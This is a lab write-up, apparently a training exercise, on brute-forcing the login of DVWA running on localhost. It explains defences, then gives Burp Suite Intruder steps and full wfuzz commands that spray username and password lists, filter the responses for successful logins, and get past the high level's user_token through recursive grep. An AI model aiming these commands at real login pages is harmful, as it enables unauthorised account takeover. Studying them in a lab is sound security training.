# Brute Force

### What is Bruce Force Attck?
A brute force attack is a type of cyber attack where an attacker attempts to guess a password or encryption key by trying every possible combination until the correct one is found. Brute force attacks are often used against systems with weak passwords or encryption keys, and can be very effective if the attacker has enough time and resources to try every possible combination.

There are several ways to prevent brute force attacks:

- Use strong passwords: Using complex and unique passwords can make it more difficult for attackers to guess the correct password.
- Limit login attempts: By limiting the number of login attempts allowed, you can prevent attackers from trying every possible combination.
- Use multi-factor authentication: Multi-factor authentication requires users to provide more than one form of authentication to access an account, making it more difficult for attackers to gain access.
- Implement rate-limiting: Rate-limiting restricts the number of requests that can be made to a system within a certain timeframe, which can prevent attackers from launching large-scale brute force attacks.
- Use intrusion detection systems: Intrusion detection systems can detect and block brute force attacks in real-time.
- Keep software up-to-date: Ensuring that software and systems are up-to-date can help prevent vulnerabilities that attackers can exploit for brute force attacks.

By implementing these measures, you can reduce the risk of a successful brute force attack.

## How to implements

#### Low level of complexity using Burp Suite CE:

1. Use Burp Suite Communit Edition to intercept a request.
2. Create a intruder to intercepted request.
3. Go to positions introducer section and add new payload marker to password.
4. Go to payload introducer section and load a list the passwords.
5. Go to settings introducer section and add a Grep - Match "Welcome"
6. Back to positions section and Start attack.

With these simple steps, we can check the Grep - Match column of the responses to find out whether any response returned true for the welcome message.

#### Low level of complexity, attack all users, using Wfuzz:

We can use man wfuzz to show the accepted parameters:

```sh
man wfuzz
```
And wfuzz -h to search for help:
```sh
wfuzz -h
```

For the first test we can try:

```sh
wfuzz -c -w ~/Downloads/passwords.txt -b 'security=low; PHPSESSID=7hs0bko62dkjmc4qvd7l8ll6i6' 'http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
```
Some explanations, -c parameters is to coloring the response, -b specify a cookie for the requests, repeat option for several cookies, -w parameters specify the path of the passwords list and the lasted parameter always is the full url that we can attack. 

> Note: We have change the password parameter in url to FUZZ

We get a return like this:

| Response | Word | Payload |
| ------ | ------ |  ------ |
| 200 | 249 W | "123456" |
| 200 | 249 W | "111111" |
| 200 | 249 W | "abc123" |
| 200 | 249 W | "qwerty" |
| 200 | 253 W | "password" |
| 200 | 249 W | "12345678" |

Now we try find the different response, but this can be hard if we work with a lot passwords list. So we can use the fiter to better return visualization. Just add --hs and --sw parameters to filter responset without 'Username and/or password incorrect.' in the body resopnse.

```sh
wfuzz --sw 253  --hs 'Username and/or password incorrect.' -c -w ~/Downloads/passwords.txt -b 'security=low; PHPSESSID=7hs0bko62dkjmc4qvd7l8ll6i6' 'http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login'
```

We get a return like this:

| Response | Word | Payload |
| ------ | ------ |  ------ |
| 200 | 253 W | "password" |

After that we can visualize the responses with more easily. It's a perfect time to remove the admin static parameter and try to add dinamic login information. To do that, we neeed to change the -w parameter to -z and add a new userNames.txt files.

```sh
wfuzz --sw 253  --hs 'Username and/or password incorrect.' -c -z file,/home/igor/Downloads/userNames.txt -z file,/home/igor/Downloads/passwords.txt -b 'security=low; PHPSESSID=7hs0bko62dkjmc4qvd7l8ll6i6' 'http://127.0.0.1/DVWA/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login'
```
> Note: We have change the user parameter in url to FUZZ
> Note: We have change the password parameter in url to FUZ2Z

We get a return like this:

| Response | Word | Payload |
| ------ | ------ |  ------ |
| 200 | 253 W | "ADMIN - password" |
| 200 | 253 W | "Admin - password" |
| 200 | 253 W | "admin - password" |
| 200 | 253 W | "gordonb - abc123" |
| 200 | 253 W | "pablo - letmein" |
| 200 | 253 W | "smithy - password"|

#### Medium level of complexity, attack all users, using Wfuzz:

At this level, responses are slower than at the low level. So we can use the same approach at the low level, do the search for different word lengths. We can remove the --sw and --hs filter parameters to try to make this return faster. 

> Note: We have change the cokkies parameters security and PHPSESID.

Once we find a different word length, just add the filter parameters to improve the data visualization.

#### High level of complexity, attack all users, using Wfuzz:

At this level, we receive a kind of cookie in the get response. The server waits for this same cookie in the url parameters to accept the next http request. So if we don't send this new valid parameter (user token) in the url, our request will not be accepted. To solve this problem, we can try to find the previously sent user_token, copy it and send it in the url parameter of the user token.

> Note: We have change the cokkies parameters security and PHPSESID. 

To make to that, we need to use Burp Suite again. So, the step by step to solve the DVWA Brute Force in high level is:

1. Use Burp Suite Communit Edition to intercept a request.
2. Create a intruder to intercepted request.
3. Go to positions introducer tab set "Choose attack type" to PitchFork (This attack use a multiple payloads, and itarates through all payloads simultaneusly) and add two payloads markers to password and user_token.
4. Go to payload introducer tab and load a list to the first password payload, in the second payload set the payload type to recursive grep.
5. Go to Resource Pool tab and create a new resource changing only the maximum concurrent requests to 1.
6. Go to settings introducer tab and add "incorrect" in Grep Match, select the user_token value a in Grep Extract and click in Start at offset and End at the fixed length radio buttons, finaly in Redirections section set click in Always radio button.
7. Click in Start attack.

Following these steps, we can extract the user_token and replace the url parameter so that our requests are accepted by the server.